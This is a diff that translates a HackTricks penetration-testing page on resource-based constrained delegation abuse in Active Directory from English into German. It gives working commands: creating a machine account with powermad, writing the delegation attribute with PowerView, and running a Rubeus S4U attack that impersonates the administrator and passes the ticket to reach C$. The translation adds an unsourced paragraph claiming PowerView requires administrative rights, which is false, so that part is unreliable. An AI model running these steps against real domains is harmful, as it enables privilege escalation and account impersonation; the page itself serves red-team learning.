@@ -1,60 +1,57 @@
-# Resource-based Constrained Delegation
+# Ressourcenbasierte eingeschränkte Delegation
 
 <details>
 
-<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Lernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
-Other ways to support HackTricks:
+Andere Möglichkeiten, HackTricks zu unterstützen:
 
-* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* Wenn Sie Ihr **Unternehmen in HackTricks bewerben möchten** oder **HackTricks als PDF herunterladen möchten**, überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
+* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
+* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
+* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegramm-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) Github-Repositories senden.
 
 </details>
 
-## Basics of Resource-based Constrained Delegation
+## Grundlagen der ressourcenbasierten eingeschränkten Delegation
 
-This is similar to the basic [Constrained Delegation](constrained-delegation.md) but **instead** of giving permissions to an **object** to **impersonate any user against a service**. Resource-based Constrain Delegation **sets** in **the object who is able to impersonate any user against it**.
+Dies ist ähnlich wie die grundlegende [eingeschränkte Delegation](constrained-delegation.md), aber anstatt Berechtigungen an ein **Objekt** zu geben, um sich als beliebiger Benutzer gegen einen Dienst zu **verkörpern**, legt die ressourcenbasierte eingeschränkte Delegation fest, **wer in der Lage ist, sich als beliebiger Benutzer gegen das Objekt zu verkörpern**.
 
-In this case, the constrained object will have an attribute called _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ with the name of the user that can impersonate any other user against it.
+In diesem Fall hat das eingeschränkte Objekt ein Attribut namens _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ mit dem Namen des Benutzers, der sich als beliebiger anderer Benutzer gegen das Objekt verkörpern kann.
 
-Another important difference from this Constrained Delegation to the other delegations is that any user with **write permissions over a machine account** (_GenericAll/GenericWrite/WriteDacl/WriteProperty/etc_) can set the _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ (In the other forms of Delegation you needed domain admin privs).
+Ein weiterer wichtiger Unterschied dieser eingeschränkten Delegation zu den anderen Delegationen besteht darin, dass jeder Benutzer mit **Schreibberechtigungen über ein Maschinenkonto** (_GenericAll/GenericWrite/WriteDacl/WriteProperty/etc_) das _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ setzen kann (Bei den anderen Formen der Delegation benötigten Sie Domänenadministratorrechte).
 
-### New Concepts
+### Neue Konzepte
 
-Back in Constrained Delegation it was told that the **`TrustedToAuthForDelegation`** flag inside the _userAccountControl_ value of the user is needed to perform a **S4U2Self.** But that's not completely truth.\
-The reality is that even without that value, you can perform a **S4U2Self** against any user if you are a **service** (have a SPN) but, if you **have `TrustedToAuthForDelegation`** the returned TGS will be **Forwardable** and if you **don't have** that flag the returned TGS **won't** be **Forwardable**.
+In der eingeschränkten Delegation wurde gesagt, dass die **`TrustedToAuthForDelegation`**-Flagge im _userAccountControl_-Wert des Benutzers benötigt wird, um eine **S4U2Self** durchzuführen. Aber das ist nicht ganz richtig.\
+Die Realität ist, dass Sie auch ohne diesen Wert eine **S4U2Self** gegen jeden Benutzer durchführen können, wenn Sie ein **Dienst** sind (eine SPN haben). Wenn Sie jedoch **`TrustedToAuthForDelegation`** haben, wird der zurückgegebene TGS **weiterleitbar** sein, und wenn Sie diese Flagge **nicht haben**, wird der zurückgegebene TGS **nicht** weiterleitbar sein.
 
-However, if the **TGS** used in **S4U2Proxy** is **NOT Forwardable** trying to abuse a **basic Constrain Delegation** it **won't work**. But if you are trying to exploit a **Resource-Based constrain delegation, it will work** (this is not a vulnerability, it's a feature, apparently).
+Wenn der in **S4U2Proxy** verwendete **TGS** **NICHT weiterleitbar** ist, funktioniert ein Versuch, eine **grundlegende eingeschränkte Delegation** auszunutzen, **nicht**. Wenn Sie jedoch versuchen, eine **ressourcenbasierte eingeschränkte Delegation auszunutzen, funktioniert es** (das ist keine Sicherheitslücke, sondern ein Feature, anscheinend).
 
-### Attack structure
+### Angriffsstruktur
 
-> If you have **write equivalent privileges** over a **Computer** account you can obtain **privileged access** in that machine.
+> Wenn Sie **Schreibberechtigungen** über ein **Computer**-Konto haben, können Sie **privilegierten Zugriff** auf diese Maschine erlangen.
 
-Suppose that the attacker has already **write equivalent privileges over the victim computer**.
+Angenommen, der Angreifer hat bereits **Schreibberechtigungen** über den Computer des Opfers.
 
-1. The attacker **compromises** an account that has a **SPN** or **creates one** (“Service A”). Note that **any** _Admin User_ without any other special privilege can **create** up until 10 **Computer objects (**_**MachineAccountQuota**_**)** and set them a **SPN**. So the attacker can just create a Computer object and set a SPN.
-2. The attacker **abuses its WRITE privilege** over the victim computer (ServiceB) to configure **resource-based constrained delegation to allow ServiceA to impersonate any user** against that victim computer (ServiceB).
-3. The attacker uses Rubeus to perform a **full S4U attack** (S4U2Self and S4U2Proxy) from Service A to Service B for a user **with privileged access to Service B**.
-   1. S4U2Self (from the SPN compromised/created account): Ask for a **TGS of Administrator to me** (Not Forwardable).
-   2. S4U2Proxy: Use the **not Forwardable TGS** of the step before to ask for a **TGS** from **Administrator** to the **victim host**.
-   3. Even if you are using a not Forwardable TGS, as you are exploiting Resource-based constrained delegation, it will work.
-4. The attacker can **pass-the-ticket** and **impersonate** the user to gain **access to the victim ServiceB**.
+1. Der Angreifer **kompromittiert** ein Konto, das eine **SPN** hat, oder **erstellt ein solches** ("Service A"). Beachten Sie, dass **jeder** _Admin-Benutzer_ ohne weitere spezielle Berechtigungen bis zu 10 **Computerobjekte (**_**MachineAccountQuota**_**)** erstellen und ihnen eine SPN zuweisen kann. Der Angreifer kann also einfach ein Computerobjekt erstellen und eine SPN setzen.
+2. Der Angreifer **missbraucht seine SCHREIB-Berechtigung** über den Computer des Opfers (ServiceB), um eine **ressourcenbasierte eingeschränkte Delegation zu konfigurieren, die ServiceA ermöglicht, sich als beliebiger Benutzer gegen den Opfercomputer** (ServiceB) zu verkörpern.
+3. Der Angreifer verwendet Rubeus, um einen **vollständigen S4U-Angriff** (S4U2Self und S4U2Proxy) von Service A auf Service B für einen Benutzer **mit privilegiertem Zugriff auf Service B** durchzuführen.
+1. S4U2Self (vom kompromittierten/erstellten Konto mit SPN): Fordern Sie ein **TGS des Administrators für mich** an (nicht weiterleitbar).
+2. S4U2Proxy: Verwenden Sie das **nicht weiterleitbare TGS** aus dem vorherigen Schritt, um ein **TGS** vom **Administrator** zum **Opferhost** anzufordern.
+3. Selbst wenn Sie ein nicht weiterleitbares TGS verwenden, funktioniert es, da Sie eine ressourcenbasierte eingeschränkte Delegation ausnutzen.
+4. Der Angreifer kann das Ticket weitergeben und den Benutzer **verkörpern**, um Zugriff auf den Opferdienst B zu erhalten.
 
-To check the _**MachineAccountQuota**_ of the domain you can use:
-
+Um die _**MachineAccountQuota**_ der Domäne zu überprüfen, können Sie Folgendes verwenden:
 ```powershell
 Get-DomainObject -Identity "dc=domain,dc=local" -Domain domain.local | select MachineAccountQuota
 ```
+## Angriff
 
-## Attack
+### Erstellen eines Computerobjekts
 
-### Creating a Computer Object
-
-You can create a computer object inside the domain using [powermad](https://github.com/Kevin-Robertson/Powermad)**:**
-
+Sie können ein Computerobjekt innerhalb der Domäne mithilfe von [powermad](https://github.com/Kevin-Robertson/Powermad)**:**
 ```powershell
 import-module powermad
 New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
@@ -62,18 +59,31 @@ New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '
 # Check if created
 Get-DomainComputer SERVICEA
 ```
+### Konfigurieren der Ressourcenbasierten Eingeschränkten Delegation
 
-### Configuring R**esource-based Constrained Delegation**
-
-**Using activedirectory PowerShell module**
-
+**Mit dem activedirectory PowerShell-Modul**
 ```powershell
 Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount SERVICEA$ #Assing delegation privileges
 Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount #Check that it worked
 ```
+**Verwendung von Powerview**
 
-**Using powerview**
+Powerview ist ein leistungsstolles PowerShell-Modul, das bei der Durchführung von Active Directory-Angriffen hilfreich ist. Es bietet verschiedene Funktionen, um Informationen über Domänen, Benutzer, Gruppen und Computer abzurufen.
 
+Um Powerview zu verwenden, müssen Sie es zuerst in Ihre PowerShell-Sitzung importieren. Verwenden Sie dazu den Befehl `Import-Module PowerView`.
+
+Sobald das Modul importiert ist, können Sie verschiedene Cmdlets verwenden, um Informationen abzurufen. Einige nützliche Cmdlets sind:
+
+- `Get-Domain`: Ruft Informationen über die Domäne ab.
+- `Get-DomainUser`: Ruft Informationen über Benutzer in der Domäne ab.
+- `Get-DomainGroup`: Ruft Informationen über Gruppen in der Domäne ab.
+- `Get-DomainComputer`: Ruft Informationen über Computer in der Domäne ab.
+
+Sie können auch spezifischere Informationen abrufen, indem Sie Filter verwenden. Zum Beispiel können Sie den Befehl `Get-DomainUser -Filter {admincount -eq 1}` verwenden, um alle Benutzer mit erhöhten Rechten abzurufen.
+
+Powerview bietet auch Funktionen zum Durchführen von Angriffen wie zum Beispiel das Sammeln von Hashes, das Erstellen von Golden Tickets und das Ausnutzen von Kerberos-Schwachstellen.
+
+Es ist wichtig zu beachten, dass Powerview administrative Rechte erfordert, um auf Active Directory zuzugreifen. Stellen Sie sicher, dass Sie über die erforderlichen Berechtigungen verfügen, bevor Sie es verwenden.
 ```powershell
 $ComputerSid = Get-DomainComputer FAKECOMPUTER -Properties objectsid | Select -Expand objectsid
 $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
@@ -88,56 +98,47 @@ msds-allowedtoactonbehalfofotheridentity
 ----------------------------------------
 {1, 0, 4, 128...}
 ```
+### Durchführung eines vollständigen S4U-Angriffs
 
-### Performing a complete S4U attack
-
-First of all, we created the new Computer object with the password `123456`, so we need the hash of that password:
-
+Zunächst haben wir das neue Computerobjekt mit dem Passwort `123456` erstellt, daher benötigen wir den Hash dieses Passworts:
 ```bash
 .\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local
 ```
-
-This will print the RC4 and AES hashes for that account.\
-Now, the attack can be performed:
-
+Dies druckt die RC4- und AES-Hashes für dieses Konto aus.\
+Nun kann der Angriff durchgeführt werden:
 ```bash
 rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<aes256 hash> /aes128:<aes128 hash> /rc4:<rc4 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /domain:domain.local /ptt
 ```
-
-You can generate more tickets just asking once using the `/altservice` param of Rubeus:
-
+Sie können mehr Tickets generieren, indem Sie einmal den `/altservice`-Parameter von Rubeus verwenden:
 ```bash
 rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt
 ```
-
 {% hint style="danger" %}
-Note that users has an attribute called "**Cannot be delegated**". If a user has this attribute to True, you won't be able to impersonate him . This property can be seen inside bloodhound.
+Beachten Sie, dass Benutzer ein Attribut namens "**Kann nicht weitergeleitet werden**" haben. Wenn ein Benutzer dieses Attribut auf True hat, können Sie ihn nicht imitieren. Diese Eigenschaft kann in Bloodhound eingesehen werden.
 {% endhint %}
 
-### Accessing
+### Zugriff
 
-The last command line will perform the **complete S4U attack and will inject the TGS** from Administrator to the victim host in **memory**.\
-In this example it was requested a TGS for the **CIFS** service from Administrator, so you will be able to access **C$**:
-
+Der letzte Befehl führt den **kompletten S4U-Angriff durch und injiziert den TGS** von Administrator in den Opfer-Host im **Speicher**.\
+In diesem Beispiel wurde ein TGS für den **CIFS-Dienst von Administrator angefordert**, sodass Sie auf **C$** zugreifen können:
 ```bash
 ls \\victim.domain.local\C$
 ```
+### Missbrauch verschiedener Diensttickets
 
-### Abuse different service tickets
+Erfahren Sie mehr über die [**verfügbaren Diensttickets hier**](silver-ticket.md#verfügbare-dienste).
 
-Lear about the [**available service tickets here**](silver-ticket.md#available-services).
+## Kerberos-Fehler
 
-## Kerberos Errors
+* **`KDC_ERR_ETYPE_NOTSUPP`**: Dies bedeutet, dass Kerberos so konfiguriert ist, dass DES oder RC4 nicht verwendet wird und Sie nur den RC4-Hash bereitstellen. Geben Sie Rubeus mindestens den AES256-Hash an (oder geben Sie ihm einfach die RC4-, AES128- und AES256-Hashes). Beispiel: `[Rubeus.Program]::MainString("s4u /user:FAKECOMPUTER /aes256:CC648CF0F809EE1AA25C52E963AC0487E87AC32B1F71ACC5304C73BF566268DA /aes128:5FC3D06ED6E8EA2C9BB9CC301EA37AD4 /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:Administrator /msdsspn:CIFS/M3DC.M3C.LOCAL /ptt".split())`
+* **`KRB_AP_ERR_SKEW`**: Dies bedeutet, dass die Zeit des aktuellen Computers von der des DC abweicht und Kerberos nicht ordnungsgemäß funktioniert.
+* **`preauth_failed`**: Dies bedeutet, dass der angegebene Benutzername + Hashes nicht zum Anmelden funktionieren. Möglicherweise haben Sie vergessen, das "$" im Benutzernamen zu setzen, wenn Sie die Hashes generieren (`.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local`)
+* **`KDC_ERR_BADOPTION`**: Dies kann bedeuten:
+* Der Benutzer, den Sie zu imitieren versuchen, kann nicht auf den gewünschten Dienst zugreifen (weil Sie ihn nicht imitieren können oder weil er nicht genügend Berechtigungen hat)
+* Der angeforderte Dienst existiert nicht (wenn Sie ein Ticket für WinRM anfordern, aber WinRM nicht ausgeführt wird)
+* Der erstellte Fakecomputer hat seine Berechtigungen über den verwundbaren Server verloren und Sie müssen sie zurückgeben.
 
-* **`KDC_ERR_ETYPE_NOTSUPP`**: This means that kerberos is configured to not use DES or RC4 and you are supplying just the RC4 hash. Supply to Rubeus at least the AES256 hash (or just supply it the rc4, aes128 and aes256 hashes). Example: `[Rubeus.Program]::MainString("s4u /user:FAKECOMPUTER /aes256:CC648CF0F809EE1AA25C52E963AC0487E87AC32B1F71ACC5304C73BF566268DA /aes128:5FC3D06ED6E8EA2C9BB9CC301EA37AD4 /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:Administrator /msdsspn:CIFS/M3DC.M3C.LOCAL /ptt".split())`
-* **`KRB_AP_ERR_SKEW`**: This means that the time of the current computer is different from the one of the DC and kerberos is not working properly.
-* **`preauth_failed`**: This means that the given username + hashes aren't working to login. You may have forgotten to put the "$" inside the username when generating the hashes (`.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local`)
-* **`KDC_ERR_BADOPTION`**: This may mean:
-  * The user you are trying to impersonate cannot access the desired service (because you cannot impersonate it or because it doesn't have enough privileges)
-  * The asked service doesn't exist (if you ask for a ticket for winrm but winrm isn't running)
-  * The fakecomputer created has lost it's privileges over the vulnerable server and you need to given them back.
-
-## References
+## Referenzen
 
 * [https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html)
 * [https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/](https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/)
@@ -146,14 +147,14 @@ Lear about the [**available service tickets here**](silver-ticket.md#available-s
 
 <details>
 
-<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Erlernen Sie das Hacken von AWS von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
-Other ways to support HackTricks:
+Andere Möglichkeiten, HackTricks zu unterstützen:
 
-* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* Wenn Sie Ihr **Unternehmen in HackTricks bewerben möchten** oder **HackTricks im PDF-Format herunterladen möchten**, überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
+* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
+* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
+* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegramm-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories senden.
 
 </details>
